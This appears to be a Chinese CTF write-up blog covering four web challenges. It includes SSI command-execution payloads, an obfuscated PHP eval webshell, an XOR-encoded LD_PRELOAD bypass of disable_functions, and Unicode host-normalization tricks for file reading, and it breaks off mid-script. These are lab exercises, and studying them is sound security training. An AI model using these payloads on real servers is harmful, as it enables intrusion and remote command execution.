<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>并不是sql注入和xss<br>一定要注意题目给的提示<br>输入username和password，可以看到是以GET方式发送的<br>获取关键词cookie<br>尝试用cookie登录<br><img src="/images/DAMXIM6X4N91NEI.png" srcset="/img/loading.gif" lazyload><br>&amp;password&#x3D;123多余了<br>去掉试试<br><img src="/images/FZ806UV2QR1V9VG2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sql注不出来，查看源码也没有什么有效的信息<br>用dirsearch扫一扫<br>没有扫出什么东西，可能是我的dirsearch太低级了<br>看了下别人的博客，dirsearch扫出了index.php.swp<br>找到了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>	***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>	***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-built_in">substr</span>(<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;password&#x27;</span>]</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>))<br></code></pre></td></tr></table></figure>
<p>没有绕过方法，写一个python脚本</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;6d0bc1&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>得出为2020666<br>输入</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">2020666</span>&amp;username=admin<br></code></pre></td></tr></table></figure>

<p>页面发出警告说明已经通过</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">$file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>          $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>          $text = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">	***&#x27;</span>;<br>          fwrite($shtml,$text);<br>          fclose($shtml);<br></code></pre></td></tr></table></figure>
<p>这里的get_hash()值是不可能求出来的，只能找出来，再在页面上找找<br><img src="/images/MUW7PLXTC8KCQ5YHP.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/NLRFZRXO510E.png" srcset="/img/loading.gif" lazyload><br>看到client ip就想xff一下，可惜x不了<br>这题的思路是利用”Apache SSI远程命令执行漏洞”<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226439.html">Apache SSI 远程命令执行漏洞复现</a><br>页面回显了username，password不能动<br>看到.shtml后缀，我们就可以利用一下<br>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行命令。<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p>进入新生成的url查看<br><img src="/images/ZJ4P7M6GGO.png" srcset="/img/loading.gif" lazyload><br>这么多的链接，要试到猴年马月<br>去根目录看看<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/EP83OM9ZY8K5GK.png" srcset="/img/loading.gif" lazyload><br>没有，那上一级看看<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/MHS82ETVEKT1RC6.png" srcset="/img/loading.gif" lazyload><br>看到位置直接cat<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/CVZTGYF5UOP7U2YGKY.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>这题源码非常简单，就是要绕过正则表达式来执行命令，不能使用换行符来绕过，要使用php异或操作即可绕过或通过url编码绕过,取反绕过<br>但是。。。<br>还是没有这么简单，本题主要内容是disable_function禁用了大量的函数导致shell上传成功但无法使用的情况出现使得难度大大提高<br>先取反绕过<br>取反操作如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><br>&gt;<br>payload<br>?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure>
<p>查看phpinfo</p>
<p>搓一个shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[a]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br><span class="hljs-meta">?&gt;</span><br>在PHP中，~ 是按位取反运算符，而用url编码是避免不可见字符<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;D&quot;</span>^<span class="hljs-string">&quot;C&quot;</span>                  异或<br><span class="hljs-comment">//$a=&#x27; </span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;B&quot;</span>);        取反<br><span class="hljs-comment">//$a=%BB                由于取反结果是一个不可见的字符。所以我们通过URL编码输出。浏览器会自动解码。~&quot;B&quot;=~%BB</span><br><span class="hljs-comment">//不太明白为什么要用assert</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/IUW8YX16KKFF6HS.png" srcset="/img/loading.gif" lazyload><br>通过phpinfo()页面可知<br><img src="/images/I1AISR2SJBF6ZWJ4.png" srcset="/img/loading.gif" lazyload><br>在phpinfo()页面可以发现禁用了非常多的函数，其中包括system、exec、shell_exec等关键执行函数<br>有shell了就连下蚁剑<br>连接发现根目录有flag，但是为空，还有一个readflag文件<br>这里可以发现readflag这个文件但是并没有执行权限，所以得绕过disable_function<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">巧用LD_PRELOAD突破disable_functions</a><br>通过文章可以了解到<br>导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell 环境中；三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。</p>
<p>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
<p>下载博主整理的源码<br>上传到蚁剑的var&#x2F;tmp目录下<br><img src="/images/IDZ3WZLUP4E34ZIGIN.png" srcset="/img/loading.gif" lazyload><br>我们需要传入三个参数，第一个参数cmd为执行的命令，第二个参数outpath为输入出文件位置，第三个sopath参数为上传的so文件所在位置<br>payload:</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">?code=$&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[_]($&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>这里使用的是异或绕过%##为16进制格式,异或转化为下<br>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>//其中$&#123;_GET&#125;[_]与$_GET[_]用法类似，但本题第二种方法试了没通过，可能是因为网络问题，没有测试很多次，十六进制数对应的字符尽量为不可见字符，不然会被浏览器编译，导致失败。。。<br></code></pre></td></tr></table></figure>
<p><img src="/images/FYRDD8A02HBUVNJJFWD.png" srcset="/img/loading.gif" lazyload><br>至此以大功告成</p>
<p>这里蚁剑有个插件<br><img src="/images/2762C95453324fd08E27D302C87A5848.png" srcset="/img/loading.gif" lazyload><br>通过加载插件启动PHP7_GC_UAF<br><img src="/images/DC94F72BF0B541ca8568BFE37596601F.png" srcset="/img/loading.gif" lazyload><br>点击开始后就可以输入命令了<br><img src="/images/C4D562C46F3E41b68215A68D0BB30357.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/images/NUADL8I15TFAOGUYBJE0V.png" srcset="/img/loading.gif" lazyload><br>将题目给的代码整理一下</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">getUrl</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname #获取域名ip 例：www.xxxx.com<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>]<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-attribute">else</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure>

<p>这道题用的是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization<br>nginx配置文件路径 black hat一个议题 任意读取文件<br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">原链接在这</a><br>先来分析代码<br>对几个函数进行解释<br>urlsplit(url)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span><br><br><span class="hljs-built_in">print</span>(urlsplit(url))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">SplitResult(</span><br><span class="hljs-string">    scheme=&#x27;https&#x27;, </span><br><span class="hljs-string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span><br><span class="hljs-string">    path=&#x27;/index.html;parameters&#x27;, </span><br><span class="hljs-string">    query=&#x27;name=tom&#x27;, </span><br><span class="hljs-string">    fragment=&#x27;example&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost<span class="hljs-selector-class">.append</span>(h<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p>对字符串 host 进行了拆分（split）操作，然后对每个分割后的子字符串进行了IDNA编码和UTF-8解码，最终将结果添加到名为 newhost 的列表中。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(finalUrl)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>
<p>使用了 urllib.request.urlopen 函数来打开指定的URL（finalUrl），并调用 read() 方法读取该URL返回的数据。</p>
<p>改一下代码，整体运行一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib import parse<br><span class="hljs-keyword">from</span> urllib.parse import urlsplit, urlparse, urlunsplit<br><br><span class="hljs-comment">#@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><br>    # url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>url = <span class="hljs-string">&quot;http://suctf.cX&quot;</span><br>host = parse.urlparse(url).hostname #获取域名ip例：www.xxxx.com<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host1= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 111&quot;</span>)<br>parts = list(urlsplit(url))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;parts = &#x27;</span>,parts)<br>host = parts[1]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host2= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 222&quot;</span>)<br>newhost = []<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>    newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>parts[1] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br><span class="hljs-comment">#去掉 url 中的空格</span><br>finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[0]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finalUrl = &#x27;</span> + finalUrl)<br>host = parse.urlparse(finalUrl).hostname<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host3= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 444&quot;</span>)<br><br><br><span class="hljs-comment">#host1= suctf.cx</span><br><span class="hljs-comment">#parts =  [&#x27;http&#x27;, &#x27;suctf.cX&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="hljs-comment">#host2= suctf.cX</span><br><span class="hljs-comment">#finalUrl = http://suctf.cX</span><br><span class="hljs-comment">#host3= suctf.cx</span><br><span class="hljs-comment">#我扌 your problem? 444</span><br></code></pre></td></tr></table></figure>


<p>从代码上看，我们需要提交一个url，用来读取服务器文件<br>需要绕过前两个if，进入第三个if来使用函数<br>而三个if中判断条件都是相同的，不过在此之前的host构造却是不同的，这也是blackhat该议题中想要说明的一点<br>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期<br>这里需要按照getUrl函数写出爆破脚本即可得到构造语句</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        